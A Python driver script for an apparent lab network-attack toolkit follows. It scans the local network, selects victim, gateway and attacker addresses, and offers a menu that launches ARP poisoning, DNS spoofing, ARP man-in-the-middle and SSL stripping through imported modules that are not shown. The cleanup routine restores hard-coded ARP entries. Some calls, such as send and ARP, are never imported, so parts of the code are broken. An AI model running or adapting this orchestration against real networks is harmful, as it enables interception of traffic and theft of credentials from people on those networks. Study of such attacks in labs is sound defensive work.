import arp_poison
import dns_spoof
import arp_mitm_gateway
import ssl_strip
import recon
import os
import sys
import threading
import atexit
import signal

# global variable for the MITM thread
mitm = None


'''
- Register the cleanup function to be called when the script is terminated by a SIGINT signal (Ctrl+C)
- Flush IPTables
- ARP Table Restoration
- Stop the MITM Attack
'''
def cleanup(signal, frame):
    global mitm

    # Stop the MITM thread
    if mitm is not None:
        # Assuming your MITM thread has a stop() method
        mitm.stop()

    # Restore ARP tables
    print("Restoring ARP tables...")
    send(ARP(op=2, pdst="10.0.2.9", psrc="10.0.2.11", hwdst="08:00:27:d7:68:54", hwsrc="08:00:27:00:AD:91"), count=5)
    send(ARP(op=2, pdst="10.0.2.11", psrc="10.0.2.9", hwdst="08:00:27:00:AD:91", hwsrc="08:00:27:d7:68:54"), count=5)

    print("Cleanup done. Exiting...")
    sys.exit(0)

# Register the cleanup function to be called on exit
signal.signal(signal.SIGINT, cleanup)


def main():
    atexit.register(cleanup)
    os.system("clear")
    interfaces = recon.list_interfaces()

    interfaceLAN = interfaces[1]
    interfaceNAT = interfaces[2]

    ipAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['ipAttacker']
    macAttackerLAN = recon.get_own_ip_mac_adress(interfaceLAN)['macAttacker']

    ipAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['ipAttacker']
    macAttackerNAT = recon.get_own_ip_mac_adress(interfaceNAT)['macAttacker']

    ipGateway = recon.get_gateway()['ipGateway']
    macGateway = recon.get_gateway()['macGateway']

    devicesListNAT = recon.scan_network(interfaceNAT)
    ipVictimNAT = devicesListNAT[3]['ip']
    macVictimNAT = devicesListNAT[3]['mac']

    devicesListLAN = recon.scan_network(interfaceLAN)
    ipVictimLAN = devicesListLAN[0]['ip']
    macVictimLAN = devicesListLAN[0]['mac']
    ipServerLAN = devicesListLAN[1]['ip']
    macServerLAN = devicesListLAN[1]['mac']

    print(interfaceNAT)
    print(interfaceLAN)


    print("#######################################")
    # print(recon.scan_network(interfaceNAT))
    print("Target IP LAN(M1): {}".format(ipVictimLAN))
    print("Target MAC LAN(M1): {}\n".format(macVictimLAN))
    print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
    print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))
    print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
    print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))
    print("Target IP NAT(M1): {}".format(ipVictimNAT))
    print("Target MAC NAT(M1): {}\n".format(macVictimNAT))
    print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
    print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))
    print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
    print("Attacker MAC (M3) NAT: {}".format(macAttackerNAT))
    print("#######################################\n\n\n")


    print("Please choose an attack:")
    print("A. ARP Poisoning")
    print("B. DNS Spoofing")
    print("C. ARP Listener")
    print("D. ARP MITM")
    print("E. SSL Stripping")
    attack = raw_input("Enter your choice: ")
    print("\n\n\n")
    
    if attack.lower() == "a":
        print("ARP Poisoning...")
        arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
    elif attack.lower() == "b":
        print("DNS Spoofing...")
        dns_spoof.dns_spoof()
    elif attack.lower() == "c":
        arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
    elif attack.lower() == "d":
        arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
    elif attack.lower() == "e":
        print("SSL Stripping...")
        # Perform Man-in-the-Middle using a separate thread 
        mitm = threading.Thread(\
            target=arp_mitm_gateway.gateway_spoof, args=  \
                ("10.0.2.11", ipAttackerNAT, ipVictimNAT, "08:00:27:00:AD:91", macAttackerNAT, macVictimNAT, interfaceNAT))
        mitm.start()
        # initiate SSL stripping attack on the NAT interface
        ssl_strip.ssl_strip(interfaceNAT)

    else:
        print("Unknown command: {}. Use either 'A', 'B', 'C', 'D', or 'E'".format(attack))
        sys.exit(1)

if __name__ == "__main__":
    main()




'''
print("#######################################")
# print(recon.scan_network(interfaceNAT))
print("Target IP LAN(M1): {}".format(ipVictimLAN))
print("Target MAC LAN(M1): {}\n".format(macVictimLAN))
print("Gateway(Server) LAN IP (M2): {}".format(ipServerLAN))
print("Gateway(Server) LAN MAC (M2): {}\n".format(macServerLAN))
print("Attacker IP (M3) LAN: {}".format(ipAttackerLAN))    
print("Attacker MAC (M3) LAN: {}\n".format(macAttackerLAN))
print("Target IP NAT(M1): {}".format(ipVictimNAT))
print("Target MAC NAT(M1): {}\n".format(macVictimNAT))
print("Gateway(Server) NAT IP (M2): {}".format(ipGateway))
print("Gateway(Server) NAT MAC (M2): {}\n".format(macGateway))
print("Attacker IP (M3) NAT: {}".format(ipAttackerNAT))    
print("Attacker MAC (M3) NAT: {}\n".format(macAttackerNAT))
print("#######################################\n\n\n")
'''